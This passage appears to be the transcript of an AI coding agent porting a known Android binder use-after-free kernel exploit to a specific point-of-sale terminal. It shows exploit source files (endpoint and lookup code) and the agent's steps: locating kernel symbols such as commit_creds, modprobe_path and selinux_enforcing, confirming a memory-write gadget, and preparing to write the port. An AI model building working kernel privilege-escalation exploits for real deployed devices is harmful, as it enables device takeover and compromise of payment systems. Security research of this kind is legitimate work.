			add_pending_node(bs, handle->client_handle);
			//uaf_node_th = add_pending_node(bs, client_handle);
			//log_info("uaf_node_th: %p\n", uaf_node_th);
			res = 0;
			break;
		case TERMINATE_PENDING_NODE:
			th = bio_get_uint32(msg) + (((uint64_t)bio_get_uint32(msg)) << 32);
			terminate_pending_node(th);
			res = 0;
			break;
		case RESERVE_BUFFER:
			if (handle->reserved_buffer) {
				log_err("A buffer is already reserved. Free it if you want to reserve another one.\n");
				res = -1;
				break;
			}
			else {
				handle->reserved_buffer = tr->data.ptr.buffer;
				res = 42; /* Instruct the calling function to skip freeing the buffer. */
			}
			break;
		case FREE_RESERVED_BUFFER:
			if (handle->reserved_buffer) {
				binder_free_buffe

...[truncated for context space] — original ~1896 tokens]...

dpoints) {
		endpoints = handle->next;
	} else {
		while (tmp->next != handle)
			tmp = tmp->next;
		/* Remove */
		tmp->next = handle->next;
	}

	free(handle->name);
	free(handle->stack);
	binder_close(handle->bs);
	free(handle);
}

/*
 * Bootstrap the binder endpoint.
 */
bool bootstrap_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = NULL;


	/* Double check that the name doesn't already exists. */
	if (_lookup_by_name(endpoint_name) != NULL) {
		log_err("[-] An endpoint already exists with that name\n");
		return false;
	}

	/* Allocate handle. */
	handle = malloc(sizeof(*handle));
	if (handle == -1) {
		log_err("[-] Unable to allocate endpoint handle. Reason: '%s'\n", strerror(errno));
		return false;
	}

	memset(handle, 0, sizeof(*handle));

	if (pthread_barrier_init(&handle->barrier, NULL, 2)) {
		perror("pthread_barrier_init");
		return false;
	}

	handle->next = NULL;
	handle->stack = malloc(65536);
	handle->name = strdup(endpoint_name);
	handle->status = 0;
	handle->pid = clone(endpoint_thread, handle->stack + 65536, CLONE_VM|SIGCHLD, handle);


	/* Wait on the barrier for the endpoint creation to be complete. */
	pthread_barrier_wait(&handle->barrier);

	if (handle->status < 0) {
		int status;
		waitpid(handle->pid, &status, NULL);
		endpoint_handle_free(handle);
		return false;
	}

	/* Insert the endpoint in the linked list. */
	if (!endpoints)
		endpoints = handle;
	else {
		struct endpoint_handle *tmp = endpoints;
		while (tmp->next != NULL)
			tmp = tmp->next;
		/* Insert. */
		tmp->next = handle;
	}

	return true;
}

bool terminate_endpoint(const char *endpoint_name)
{
	struct endpoint_handle *handle = _lookup_by_name(endpoint_name);
	int status;

	if (!handle) {
		log_err("[-] No endpoint named: '%s'\n", endpoint_name);
		exit(1);
		return false;
	}
	kill(handle->pid, SIGKILL);
	waitpid(handle->pid, &status, 0);

	endpoint_handle_free(handle);

	return true;
}

struct endpoint_handle *get_endpoints()
{
   return endpoints;
}



[tool • read]
#ifndef ENDPOINT_H_
# define ENDPOINT_H_
#include <setjmp.h>

struct endpoint_handle {
	struct endpoint_info *next;
	uint8_t *name;
	struct binder_state *bs;
	void *stack;
	pid_t pid;
	pthread_barrier_t barrier;
	int status;
	uint64_t client_handle;
	uint64_t reserved_buffer;
	jmp_buf env;
};



typedef enum {
	GET_VMA_START = 0,
	EXCHANGE_HANDLES,
	ADD_PENDING_NODE,
	TERMINATE_PENDING_NODE,
	RESERVE_BUFFER,
	FREE_RESERVED_BUFFER,
	TRIGGER_DECREF,
} endpoint_cmd_t;


bool bootstrap_endpoint(const char *endpoint_name);
bool terminate_endpoint(const char *endpoint_name);
struct endpoint_handle *get_endpoints();



#endif /*! ENDPOINT_H_ */


[assistant]
<acp tokens="30" type="text" time="2026-11-15 14:30:23">m05150</acp>

Now the remaining headers and the handle/lookup modules, then I check device kernel symbols and start writing the port.

[assistant]
<acp tokens="52" type="text" time="2026-11-15 14:30:31">m05165</acp>

All BFS reference sources read. Now the device-side facts: kallsyms symbols, the on-device binder layout disasm I verified earlier, and seq_file source for the leak vehicle. Checking what's already on disk:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && ls tmp/m3/ | grep -iE 'kallsyms|seq_file' ; echo ===; grep -E ' (single_open|seq_read|seq_open)$' tmp/m3/kallsyms_root.txt 2>/dev/null || find . -name 'kallsyms*' | head -5"}

[tool • bash]
dump_boot_kallsyms.sh
kallsyms_api.txt
kallsyms_binder_freealloc.txt
kallsyms_binder.txt
kallsyms_core.txt
kallsyms_core_uniq.txt
kallsyms_key.txt
kallsyms_mali2.txt
kallsyms_mali.txt
kallsyms_root.txt
kallsyms.txt
===
c02e09b4 T seq_open
c02e0da4 T seq_read
c02e12a0 T single_open


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E 'single_open|single_open_size' kallsyms_root.txt | head -3; echo ===; grep -iE ' selinux_enforcing| modprobe_path| init_task| init_cred| init_uts_ns| sys_call_table' kallsyms_root.txt; echo === seq_file alloc size check:; find . -name 'seq_file.c' -o -name '*seq*file*' | grep -v bfs | head; echo ===; ls kern_ref/"}

[tool • bash]
c02e12a0 T single_open
c02e133c T single_open_size
c0328340 t proc_single_open
===
c0108944 T sys_call_table
c1112cec D init_uts_ns
c1112ec0 D init_task
c111ffd0 D init_cred
c112048c D modprobe_path
c1315190 B selinux_enforcing
=== seq_file alloc size check:
===
414_binder_alloc.c
414_binder.c
414_binder.h
414_eventpoll.c
5x_binder.c
aosp414.c
binder_alloc.c
binder_alloc.h
lts_0423.html
lts_0423.txt
vanilla414b.c
vanilla_414_binder.c


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && find . -maxdepth 3 -iname '*seq_file*' 2>/dev/null | head; find ~/Desktop -maxdepth 4 -iname 'seq_file.c' 2>/dev/null | head -3; echo ===; grep -n 'struct seq_file {' -A 20 kern_ref/*.c 2>/dev/null | head -5; echo === kernel source tree locations:; ls ~/linux* ~/Desktop/linux* 2>/dev/null | head; find / -maxdepth 3 -name 'linux-4.14*' -o -maxdepth 3 -name 'linux-*4.14' 2>/dev/null | head -3"}

[tool • bash]
===
=== kernel source tree locations:


[assistant • read]
{"limit":160,"offset":120,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/bfs_ref/lpe/src/binder_lookup.c"}

[tool • read]
   struct binder_buffer_object *bbo = NULL;

   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;


   memset(txn_data, 0, 0x1000);
   bzero(&bwr, sizeof(bwr));


   name = hidl_string_new(service);
   instance = hidl_string_new("default");

   ptr = txn_data;

   /* Write the interface token first, as a classic C string, while taking
    * care of padding to 32bits.
    */
   memcpy(ptr, HWSERVICE_MANAGER, sizeof(HWSERVICE_MANAGER) + 1);
   ptr += sizeof(HWSERVICE_MANAGER) + 1;

   /* Align on 32bits. */
   while (((uint64_t)ptr) % sizeof(uint32_t))
      ptr++;

   /* write the hidl_string. */
   bbo = (struct binder_buffer_object *)ptr;
   bbo[0].hdr.type = BINDER_TYPE_PTR;
   bbo[0].buffer = name;
   bbo[0].length  = sizeof(struct hidl_string);
   bbo[0].flags = 0;
   bbo[0].parent = 0;
   bbo[0].parent_offset = 0;
   name_parent_off = (uint64_t)((uint8_t*)bbo - txn_data);
   buffers_size += bbo[0].length;
   *(offs++) = name_parent_off;

   ptr = &bbo[1];

   /* Embed the pointer. */
   bbo[1].hdr.type = BINDER_TYPE_PTR;
   bbo[1].buffer = name->buffer;
   bbo[1].length  = name->size + 1;
   bbo[1].flags = 1; //HAS_PARENT;
   //bbo[1].parent = name_parent_off;
   bbo[1].parent = 0;
   bbo[1].parent_offset = 0;
   buffers_size += bbo[1].length;
   *(offs++) = (uint64_t)((uint8_t*)&bbo[1] - txn_data);

   ptr = &bbo[2];

   bbo[2].hdr.type = BINDER_TYPE_PTR;
   bbo[2].buffer = instance;
   bbo[2].length = sizeof(struct hidl_string);
   bbo[2].flags = 0;
   instance_parent_off = (uint64_t)((uint8_t *)&bbo[2] - txn_data);
   *(offs++) = (uint64_t)((uint8_t*)&bbo[2] - txn_data);
   buffers_size += bbo[2].length;

   /* Embed the pointer. */
   bbo[3].hdr.type = BINDER_TYPE_PTR;
   bbo[3].buffer = instance->buffer;
   bbo[3].length  = instance->size + 1;
   bbo[3].flags = 1; //HAS_PARENT;
   //bbo[3].parent = instance_parent_off;
   bbo[3].parent = 2;
   bbo[3].parent_offset

...[truncated for context space] — original ~1123 tokens]...

 offsets;

   /* Align buffers size. */
   while (buffers_size % 8)
      buffers_size++;
   writebuf.buffers_size = buffers_size;

   bwr.write_size = sizeof(writebuf);
   bwr.write_consumed = 0;
   bwr.write_buffer = &writebuf;
   bwr.read_size = 0;
   bwr.read_consumed = 0;
   bwr.read_buffer = 0;

   /* Send query. */
   ioctl(bs->fd, BINDER_WRITE_READ, &bwr);
   uint32_t remaining, consumed;
   uint32_t rdata[32];
   remaining = 0, consumed = 0;

   while (binder_read_next(bs, rdata, &remaining, &consumed) != BR_REPLY);

   struct binder_transaction_data *tr = (struct binder_transaction *)((uint8_t*)rdata + consumed - sizeof(*tr));

   struct flat_binder_object *fbo = (struct flat_binder_object *)(tr->data.ptr.buffer + 4);

   /* Acquire the ref. */
   binder_acquire(bs, fbo->handle);

   /* Free the transaction. */
   binder_free_buffer(bs, tr->data.ptr.buffer);

   return fbo->handle;
}

hidl_vec * create_token(struct binder_state *bs, uint64_t tm_handle, uint64_t my_handle)
{
   uint8_t txn_data[0x1000];
   uint8_t reply_data[0x1000];
   uint8_t *ptr = txn_data;
   uint64_t offsets[0x10];
   uint64_t *offs = offsets;
   struct binder_write_read bwr;
   uint32_t buffers_size = 0;

   struct hidl_string *name;
   struct hidl_string *instance;
   uint64_t name_parent_off = 0;
   uint64_t instance_parent_off = 0;

   struct binder_buffer_object *bbo = NULL;

   struct {
      uint32_t cmd;
      struct binder_transaction_data txn;
      binder_size_t buffers_size;
   } __attribute__((packed)) writebuf;


   memset(txn_data, 0, 0x1000);
   bzero(&bwr, sizeof(bwr));


   ptr = txn_data;

   /* Write the interface token first, as a classic C string, while taking
    * care of padding to 32bits.
    */
   memcpy(ptr, TOKEN_MANAGER, sizeof(TOKEN_MANAGER) + 1);
   ptr += sizeof(TOKEN_MANAGER) + 1;

   /* Align on 32bits. */
   while (((uint64_t)ptr) % sizeof(uint32_t))
      ptr++;

   /* Add our strong binder. */

[204 more lines in file. Use offset=280 to continue.]

[assistant]
<acp tokens="90" type="text" time="2026-11-15 14:32:37">m05174</acp>
The BFS choreography is clear. Two load-bearing facts before writing code: (1) the leak-vehicle `struct seq_file` field offsets on THIS build (the +0x38/+0x40 leak window must catch a self-pointed kernel address), (2) `binder_ref` exact layout (kmalloc class matters). Checking kernel config and disassembling `single_open` to see the actual seq_file layout:

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220 && find . -name 'config_full.txt' 2>/dev/null | head -3; CFG=$(find . -name 'config_full.txt' | head -1); echo \"CFG=$CFG\"; grep -E 'CONFIG_(DEBUG_SPINLOCK|MUTEX_SPIN_ON_OWNER|DEBUG_MUTEXES|USER_NS|PROVE_LOCKING|DEBUG_LOCK_ALLOC|DEBUG_LIST|SLUB|SLAB|LOCKDEP|PROVE_RCU|DEBUG_ATOMIC)' \"$CFG\" 2>/dev/null"}

[tool • bash]
./tmp/m3/gl/config_full.txt
CFG=./tmp/m3/gl/config_full.txt
CONFIG_LOCKDEP_SUPPORT=y
CONFIG_SLUB_DEBUG=y
# CONFIG_SLUB_MEMCG_SYSFS_ON is not set
# CONFIG_SLAB is not set
CONFIG_SLUB=y
CONFIG_SLAB_MERGE_DEFAULT=y
# CONFIG_SLAB_FREELIST_RANDOM is not set
# CONFIG_SLAB_FREELIST_HARDENED is not set
CONFIG_SLUB_CPU_PARTIAL=y
CONFIG_SLABINFO=y
CONFIG_MUTEX_SPIN_ON_OWNER=y
# CONFIG_SLUB_DEBUG_ON is not set
# CONFIG_SLUB_STATS is not set
# CONFIG_DEBUG_SPINLOCK is not set
# CONFIG_DEBUG_MUTEXES is not set
# CONFIG_DEBUG_LOCK_ALLOC is not set
# CONFIG_PROVE_LOCKING is not set
# CONFIG_DEBUG_ATOMIC_SLEEP is not set
CONFIG_DEBUG_LIST=y
# CONFIG_PROVE_RCU is not set


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls gl/ | head; ls gl/*seq* 2>/dev/null; find gl -name '*single*' -o -name '*fsseq*' -o -name '*seq_file*' 2>/dev/null | head"}

[tool • bash]
b_0xc08838bc.bin
b_0xc0885104.bin
build33.sh
build34.sh
build35.sh
chain.bin
config_full.txt
crash2.txt
crash3.txt
dbg_agu2.bin


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls gl/ | wc -l; ls gl/ | grep -iE 'single|seq|epitem|binder'; echo ===; which arm-linux-gnueabi-objdump arm-linux-androideabi-objdump python3; ls ~/Desktop/Android/ndk/ 2>/dev/null"}

[tool • bash]
219
===
/usr/bin/python3
android-ndk-r10e-linux-x86_64.zip
android-ndk-r21e-linux-x86_64.zip
android-ndk-r25c
android-ndk-r25c-linux.zip
platform-tools_r34.0.5-linux.zip
platform-tools_r34.0.5-windows.zip


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls gl/ | grep -E '\\.bin$' | head -30; echo; ls gl/*.txt 2>/dev/null | head; ls gl/ | grep -iE 'disasm|\\.S$|gas|\\.lst' | head"}

[tool • bash]
b_0xc08838bc.bin
b_0xc0885104.bin
chain.bin
dbg_agu2.bin
dbg.bin
dbg_cs.bin
dbg_dec2.bin
dbg_dec3.bin
dbg_dec.bin
dbg_iec.bin
dbg_mc.bin
dbg_mm.bin
dbg_sbcc2.bin
dbg_sbcc.bin
dbg_sem2.bin
dbg_sem3.bin
dbg_sem.bin
dbg_sys_recvfrom.bin
dbg_sys_sysinfo.bin
dbg_vma.bin
_d.bin
d_grab.bin
d_lp1.bin
d_reg2.bin
d_reg_sysctl.bin
f.bin
f_futex_wait_requeue_pi.constprop.9.bin
f_sys_add_key.bin
f_sys_execve.bin
f_sys_getsockopt.bin

gl/config_full.txt
gl/crash2.txt
gl/crash3.txt
gl/framedepth_out.txt
gl/g21_graph.txt


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && grep -E 'c087e318|c0880a8c|c0880900|c02e12a0|binder_dec_node_nilocked|binder_validate_fixup|binder_transaction\\b|binder_transaction_buffer_release|snd_ctl|single_open' kallsyms_root.txt; echo ===; grep -cE '^c[0-9a-f]{7} T' kallsyms_root.txt"}

[tool • bash]
c02e12a0 T single_open
c02e133c T single_open_size
c0328340 t proc_single_open
c0334ce8 T single_open_net
c0444fbc T security_binder_transaction
c044ee60 t selinux_binder_transaction
c087e318 t binder_validate_fixup
c087e928 t perf_trace_binder_transaction
c087f6c4 t trace_event_raw_event_binder_transaction
c08800f8 t trace_raw_output_binder_transaction
c0880900 t binder_dec_node_nilocked
c0884c50 t binder_transaction_buffer_release
c0885104 t binder_transaction
c089fa80 t snd_ctl_elem_user_info
c089fb20 t snd_ctl_poll
c089fb84 T snd_ctl_boolean_mono_info
c089fbb4 T snd_ctl_boolean_stereo_info
c089fbe8 T snd_ctl_find_numid
c089fc48 T snd_ctl_get_preferred_subdevice
c089fccc t snd_ctl_new
c089fd68 T snd_ctl_new1
c089fea8 T snd_ctl_free_one
c089fee0 t snd_ctl_elem_user_free
c089ff14 t snd_ctl_empty_read_queue
c089ff94 T snd_ctl_find_id
c08a0064 T snd_ctl_rename_id
c08a0108 t snd_ctl_dev_disconnect
c08a017c t snd_ctl_dev_register
c08a01c0 t snd_ctl_fasync
c08a01e4 t snd_ctl_release
c08a02dc t snd_ctl_tlv_ioctl
c08a0568 t snd_ctl_elem_unlock
c08a06b4 t snd_ctl_elem_list
c08a0944 t snd_ctl_elem_info_user
c08a0b88 t snd_ctl_elem_user_get
c08a0be8 t snd_ctl_elem_user_put
c08a0c74 t snd_ctl_elem_user_enum_info
c08a0d60 t snd_ctl_read
c08a0fe8 T snd_ctl_notify
c08a1174 T snd_ctl_remove
c08a1278 T snd_ctl_remove_id
c08a12e0 t snd_ctl_remove_user_ctl
c08a1394 t snd_ctl_elem_remove
c08a1464 t snd_ctl_dev_free
c08a14c0 T snd_ctl_activate_id
c08a15d0 t snd_ctl_elem_write_user
c08a17ec t snd_ctl_elem_user_tlv
c08a1a00 t snd_ctl_find_hole
c08a1aa4 t __snd_ctl_add
c08a1c54 T snd_ctl_add
c08a1cd8 t snd_ctl_elem_add_user
c08a220c T snd_ctl_replace
c08a23f4 t snd_ctl_open
c08a258c T snd_ctl_enum_info
c08a2620 T snd_ctl_unregister_ioctl
c08a26bc T snd_ctl_register_ioctl
c08a2750 t snd_ctl_ioctl
c08a2ec8 T snd_ctl_create
c0bb80e8 r snd_ctl_f_ops
c0e90694 r __tracepoint_ptr_binder_transaction_buffer_release
c0e906b0 r __tracepoint_ptr_binder_transaction
c0e93abd r __tpstrtab_binder_transa

...[truncated for context space] — original ~1034 tokens]...

0e9d0e8 r __ksymtab_snd_ctl_add
c0e9d0f0 r __ksymtab_snd_ctl_boolean_mono_info
c0e9d0f8 r __ksymtab_snd_ctl_boolean_stereo_info
c0e9d100 r __ksymtab_snd_ctl_enum_info
c0e9d108 r __ksymtab_snd_ctl_find_id
c0e9d110 r __ksymtab_snd_ctl_find_numid
c0e9d118 r __ksymtab_snd_ctl_free_one
c0e9d120 r __ksymtab_snd_ctl_new1
c0e9d128 r __ksymtab_snd_ctl_notify
c0e9d130 r __ksymtab_snd_ctl_register_ioctl
c0e9d138 r __ksymtab_snd_ctl_remove
c0e9d140 r __ksymtab_snd_ctl_remove_id
c0e9d148 r __ksymtab_snd_ctl_rename_id
c0e9d150 r __ksymtab_snd_ctl_replace
c0e9d158 r __ksymtab_snd_ctl_unregister_ioctl
c0ea53a0 r __ksymtab_single_open_net
c0ea5628 r __ksymtab_snd_ctl_activate_id
c0ea5630 r __ksymtab_snd_ctl_get_preferred_subdevice
c0eb8fe7 r __kstrtab_single_open_size
c0eb8ff8 r __kstrtab_single_open
c0eba9fe r __kstrtab_single_open_net
c0ed42de r __kstrtab_snd_ctl_enum_info
c0ed42f0 r __kstrtab_snd_ctl_boolean_stereo_info
c0ed430c r __kstrtab_snd_ctl_boolean_mono_info
c0ed4326 r __kstrtab_snd_ctl_get_preferred_subdevice
c0ed4346 r __kstrtab_snd_ctl_unregister_ioctl
c0ed435f r __kstrtab_snd_ctl_register_ioctl
c0ed4376 r __kstrtab_snd_ctl_find_id
c0ed4386 r __kstrtab_snd_ctl_find_numid
c0ed4399 r __kstrtab_snd_ctl_rename_id
c0ed43ab r __kstrtab_snd_ctl_activate_id
c0ed43bf r __kstrtab_snd_ctl_remove_id
c0ed43d1 r __kstrtab_snd_ctl_remove
c0ed43e0 r __kstrtab_snd_ctl_replace
c0ed43f0 r __kstrtab_snd_ctl_add
c0ed43fc r __kstrtab_snd_ctl_free_one
c0ed440d r __kstrtab_snd_ctl_new1
c0ed441a r __kstrtab_snd_ctl_notify
c1046cac t trace_event_define_fields_binder_transaction
c10a1140 t __event_binder_transaction_buffer_release
c10a115c t __event_binder_transaction
c1217e08 d print_fmt_binder_transaction
c12180a4 d trace_event_type_funcs_binder_transaction
c1218564 d event_binder_transaction_buffer_release
c1218794 d event_binder_transaction
c12389a0 d event_class_binder_transaction
c123de98 D __tracepoint_binder_transaction
c123df28 D __tracepoint_binder_transaction_buffer_release
===
18334


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls tools 2>/dev/null | head; ls *.py 2>/dev/null | head; echo ===; find . -maxdepth 2 -name '*.py' | grep -iE 'dis|kallsym|zimage' | head; echo ===; which objdump llvm-objdump; ~/Desktop/Android/ndk/android-ndk-r25c/toolchains/llvm/prebuilt/linux-x86_64/bin/llvm-objdump --version 2>/dev/null | head -2"}

[tool • bash]
allow_isolated_scan.py
binder_gate.py
binder_variants.py
blmap.py
brute2.py
brute_parcel.py
build_abi2_probe.py
build_abisize_probe.py
build_binder_final.py
build_binder_find.py
===
./dispatch_emu.py
./iodispatch.py
./kdis.py
===
/usr/bin/objdump
LLVM (http://llvm.org/):
  LLVM version 14.0.7git


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && head -30 kdis.py"}

[tool • bash]
#!/usr/bin/env python3
"""Disassemble a kernel function from tmp/m3/kernel.raw using tmp/m3/kallsyms.txt.

Usage:
  kdis.py <symbol> [--next <symbol>] [--off <delta>] [--len <n>]

_text == stext == 0xc0008000 == file offset 0 (proven earlier: commit_creds
0xc014fa74 -> file 0x147a74 matches the expected prologue bytes).
"""
import sys, re

TEXT_VA = 0xc0008000
KERNEL = 'tmp/m3/kernel.raw'
KSYM = 'tmp/m3/kallsyms.txt'

def load_syms():
    syms = {}
    order = []
    with open(KSYM) as f:
        for line in f:
            p = line.split()
            if len(p) != 3:
                continue
            try:
                va = int(p[0], 16)
            except ValueError:
                continue
            syms[p[2]] = (va, p[1])
            order.append((va, p[2]))
    order.sort()


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls kernel.raw kallsyms.txt 2>/dev/null; python3 kdis.py single_open --next single_open_size 2>/dev/null | head -60"}

[tool • bash]
kallsyms.txt


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls *.raw kernel* 2>/dev/null | head; ls gl/kernel* 2>/dev/null; ls ../../*.bin 2>/dev/null | head -3; find . -maxdepth 2 -name 'kernel*' | head"}

[tool • bash]
kernel_gz2.bin
kernel_img.bin
./kernel_gz2.bin
./kernel_img.bin


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && ls -la kernel_gz2.bin kernel_img.bin; file kernel_img.bin kernel_gz2.bin; echo ===; find .. -name 'zImage.bin' 2>/dev/null | head; ls /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/baseline 2>/dev/null | head"}

[tool • bash]
-rw-rw-r-- 1 enryu enryu 123714 Nov 14 21:08 kernel_gz2.bin
-rw-rw-r-- 1 enryu enryu 123714 Nov  3 14:50 kernel_img.bin
kernel_img.bin: Linux make config build file, ASCII text
kernel_gz2.bin: Linux make config build file, ASCII text
===
../m3/zImage.bin
device
usb


[assistant • read]
{"limit":40,"offset":30,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kdis.py"}

[tool • read]
    order.sort()
    return syms, order

def next_after(order, va):
    for v, n in order:
        if v > va:
            return v, n
    return None, None

def main():
    if len(sys.argv) < 2:
        print(__doc__); sys.exit(1)
    target = sys.argv[1]
    off = 0
    length = None
    for i, a in enumerate(sys.argv):
        if a == '--off':
            off = int(sys.argv[i+1], 0)
        if a == '--len':
            length = int(sys.argv[i+1], 0)

    syms, order = load_syms()
    if target not in syms:
        cands = [n for n in syms if target.lower() in n.lower()]
        print('symbol not found. candidates:', cands[:20]); sys.exit(2)
    va, typ = syms[target]
    nva, nname = next_after(order, va)
    end = nva if nva else va + 0x400
    start = va + off
    if length:
        end = start + length
    if end <= start:
        end = start + 0x200

    foff = start - TEXT_VA
    n = end - start
    with open(KERNEL, 'rb') as f:
        f.seek(foff)
        blob = f.read(n)


[17 more lines in file. Use offset=70 to continue.]

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && readlink -f kallsyms.txt; ls -la /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/zImage.bin 2>/dev/null; ls /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/ | head -30"}

[tool • bash]
/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kallsyms.txt
AGENTS.md
asu
baseline
check_pass_log.py
docs
evidence
findings
hash.txt
http.pid
learning-proposals.jsonl
LogManager.apk
newpos9220_scan_20261102
package-lock.json
passwords.txt
PlatformSdk.jar
PosMasterService.apk
PosSettings.apk
prod
recovered
report
scope.md
tmp
tmp2
tools
twiga_v2


[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3 && find .. ../.. -maxdepth 2 -name 'zImage*' 2>/dev/null; ls -la zImage.bin 2>/dev/null; find /home/enryu/Desktop/Temp/OneProMag -name 'zImage*' 2>/dev/null | head -3; echo; head -3 kallsyms.txt"}

[tool • bash]
../m3/zImage2.bin
../m3/zImage.bin
-rw-rw-r-- 1 enryu enryu 19307708 Nov  3 14:51 zImage.bin

c0008000 T stext
c0008000 T _text
c000808c t __create_page_tables


[assistant]
<acp tokens="43" type="text" time="2026-11-15 14:33:17">m05201</acp>
zImage.bin and kallsyms.txt are in place. Disassembling `single_open` to verify the seq_file leak-vehicle layout, and `binder_dec_node_nilocked` to re-confirm the gadget:

[assistant]
<acp tokens="116" type="text" time="2026-11-15 14:38:04">m05214</acp>

The gadget is confirmed live at `c0880a8c–c0880ab4`: `str r3,[r2]` (4-byte write, what@+0x14, where@+0x18), mirror `strne r2,[r3,#4]` skipped when what==0, then hlist poison + kfree. All gadget conditions verified in the disasm (refs empty, local_strong 1→0, tmp_refs recheck under dead_nodes_lock, BUG_ON needs `*(node+8)==node+8`).

Now I need the exact refcount accounting from the kernel source on disk (this determines how many strong decs free the node):

[assistant • bash]
{"command":"cd /home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref && grep -n 'binder_new_node\\|local_strong_refs\\|internal_strong_refs\\|local_weak_refs\\|tmp_refs' 414_binder.c | head -30"}

[tool • bash]
320: * @internal_strong_refs: used to take strong references when
324: * @local_weak_refs:      weak user refs from local process
327: * @local_strong_refs:    strong user refs from local process
330: * @tmp_refs:             temporary kernel refs
373:	int internal_strong_refs;
374:	int local_weak_refs;
375:	int local_strong_refs;
376:	int tmp_refs;
1146:	node->tmp_refs++;
1167:static struct binder_node *binder_new_node(struct binder_proc *proc,
1205:			    node->internal_strong_refs == 0 &&
1213:			node->internal_strong_refs++;
1215:			node->local_strong_refs++;
1222:			node->local_weak_refs++;
1257:			node->internal_strong_refs--;
1259:			node->local_strong_refs--;
1260:		if (node->local_strong_refs || node->internal_strong_refs)
1264:			node->local_weak_refs--;
1265:		if (node->local_weak_refs || node->tmp_refs ||
1276:		if (hlist_empty(&node->refs) && !node->local_strong_refs &&
1277:		    !node->local_weak_refs && !node->tmp_refs) {
1288:				 * tmp_refs could have changed so
1291:				if (node->tmp_refs) {
1323:	 * tmp_refs
1325:	node->tmp_refs++;
1337: * node->tmp_refs against dead-node-only cases where the node
1369:	node->tmp_refs--;
1370:	BUG_ON(node->tmp_refs < 0);
2244:		node = binder_new_node(proc, fp);
3340:				     node->debug_id, node->local_strong_refs,


[assistant • read]
{"limit":180,"offset":1167,"path":"/home/enryu/Desktop/Project/Brilink/Brilink_EDC/EDC_newpos_9220/tmp/m3/kern_ref/414_binder.c"}

[tool • read]
static struct binder_node *binder_new_node(struct binder_proc *proc,
					   struct flat_binder_object *fp)
{
	struct binder_node *node;
	struct binder_node *new_node = kzalloc(sizeof(*node), GFP_KERNEL);

	if (!new_node)
		return NULL;
	binder_inner_proc_lock(proc);
	node = binder_init_node_ilocked(proc, new_node, fp);
	binder_inner_proc_unlock(proc);
	if (node != new_node)
		/*
		 * The node was already added by another thread
		 */
		kfree(new_node);

	return node;
}

static void binder_free_node(struct binder_node *node)
{
	kfree(node);
	binder_stats_deleted(BINDER_STAT_NODE);
}

static int binder_inc_node_nilocked(struct binder_node *node, int strong,
				    int internal,
				    struct list_head *target_list)
{
	struct binder_proc *proc = node->proc;

	assert_spin_locked(&node->lock);
	if (proc)
		assert_spin_locked(&proc->inner_lock);
	if (strong) {
		if (internal) {
			if (target_list == NULL &&
			    node->internal_strong_refs == 0 &&
			    !(node->proc &&
			      node == node->proc->context->binder_context_mgr_node &&
			      node->has_strong_ref)) {
				pr_err("invalid inc strong node for %d\n",
					node->debug_id);
				return -EINVAL;
			}
			node->internal_strong_refs++;
		} else
			node->local_strong_refs++;
		if (!node->has_strong_ref && target_list) {
			binder_dequeue_work_ilocked(&node->work);
			binder_enqueue_work_ilocked(&node->work, target_list);
		}
	} else {
		if (!internal)
			node->local_weak_refs++;
		if (!node->has_weak_ref && list_empty(&node->work.entry)) {
			if (target_list == NULL) {
				pr_err("invalid inc weak node for %d\n",
					node->debug_id);
				return -EINVAL;
			}
			binder_enqueue_work_ilocked(&node->work, target_list);
		}
	}
	return 0;
}

static int binder_inc_node(struct binder_node *node, int strong, int internal,
			   struct list_head *target_list)
{
	int ret;

	binder_node_inner_lock(node);
	ret = binder_inc_node_nilocked(node, strong, internal, target_list);
	binder_node_inner_unlock(node);

	return ret;
}

s

...[truncated for context space] — original ~1213 tokens]...

l_weak_refs && !node->tmp_refs) {
			if (proc) {
				binder_dequeue_work_ilocked(&node->work);
				rb_erase(&node->rb_node, &proc->nodes);
				binder_debug(BINDER_DEBUG_INTERNAL_REFS,
					     "refless node %d deleted\n",
					     node->debug_id);
			} else {
				BUG_ON(!list_empty(&node->work.entry));
				spin_lock(&binder_dead_nodes_lock);
